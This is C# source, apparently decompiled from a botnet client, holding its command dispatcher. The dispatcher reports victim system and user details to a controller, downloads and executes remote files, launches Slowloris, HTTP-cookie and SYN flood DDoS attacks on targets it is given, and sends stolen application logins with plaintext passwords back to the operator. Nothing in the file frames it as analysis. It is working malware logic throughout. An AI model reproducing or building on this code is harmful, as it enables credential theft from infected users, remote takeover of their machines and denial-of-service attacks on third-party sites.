using System;
using System.Windows.Forms;

internal sealed class Class27
{
	public static void smethod_0(string string_0)
	{
		string[] array = string_0.Split(new char[1] { '*' });
		if (string_0.Contains(".info"))
		{
			Class30.class28_0.method_3("Info Task -> OS: " + Class25.smethod_1() + " -Country: " + Class25.smethod_2() + " -User: " + Environment.UserDomainName + "/" + Environment.UserName, Class11.string_1, "cyan");
		}
		if (string_0.Contains(".version"))
		{
			Class30.class28_0.method_3("Info Task -> Version: " + Class11.string_2, Class11.string_1, "cyan");
		}
		if (string_0.Contains(".path"))
		{
			Class30.class28_0.method_3("Info Task -> Path: " + Application.get_ExecutablePath(), Class11.string_1, "cyan");
		}
		if (string_0.Contains(".dl"))
		{
			Class1.smethod_0(array[1]);
			Class30.class28_0.method_3("Task: File downloaded & executed!", Class11.string_1, "lime");
		}
		if (string_0.Contains(".update"))
		{
			Class1.smethod_0(array[1]);
			Class30.class28_0.method_3("Task: Update started!", Class11.string_1, "lime");
			Class26.smethod_0();
		}
		if (string_0.Contains(".kill"))
		{
			Class30.class28_0.method_3("Task: Bot exits now, bye!", Class11.string_1, "lime");
			Environment.Exit(0);
		}
		if (string_0.Contains(".slowloris"))
		{
			Class3.string_0 = array[1];
			Class3.smethod_0();
			Class30.class28_0.method_3("DDos: Slowloris Flood on " + Class3.string_0 + " started!", Class11.string_1, "lime");
		}
		if (string_0.Contains(".httpcookie"))
		{
			Class5.string_0 = array[1];
			Class5.int_1 = Convert.ToInt32(array[2]);
			Class5.int_0 = Convert.ToInt32(array[3]);
			Class5.bool_0 = true;
			Class5.smethod_1();
			Class30.class28_0.method_3("DDos: HTTP COOKIE Flood on " + Class5.string_0 + " started!", Class11.string_1, "lime");
		}
		if (string_0.Contains(".syn"))
		{
			Class23.string_0 = array[1];
			Class23.int_0 = Convert.ToInt32(array[2]);
			Class23.int_2 = Convert.ToInt32(array[3]);
			Class23.int_1 = Convert.ToInt32(array[4]);
			Class23.smethod_0();
			Class23.bool_0 = true;
			Class30.class28_0.method_3("DDos: SYN Flood on " + Class23.string_0 + " started!", Class11.string_1, "lime");
		}
		if (string_0.Contains(".stopddos"))
		{
			Class21.smethod_0();
		}
		if (!string_0.Contains(".stealer"))
		{
			return;
		}
		string value = array[1];
		if (array[1] == "ListAll")
		{
			for (int i = 0; i <= Class19.list_0.Count - 1; i++)
			{
				Class30.class28_0.method_3("Task: Found Login -> Application: " + Class19.list_0[i].method_0() + " Host: " + Class19.list_0[i].method_2() + " User: " + Class19.list_0[i].method_4() + " Password: " + Class19.list_0[i].method_6(), Class11.string_1, "cyan");
			}
			return;
		}
		for (int i = 0; i <= Class19.list_0.Count - 1; i++)
		{
			if (Class19.list_0[i].method_2().Contains(value))
			{
				Class30.class28_0.method_3("Task: Found Login -> Application: " + Class19.list_0[i].method_0() + " Host: " + Class19.list_0[i].method_2() + " User: " + Class19.list_0[i].method_4() + " Password: " + Class19.list_0[i].method_6(), Class11.string_1, "cyan");
			}
		}
	}
}
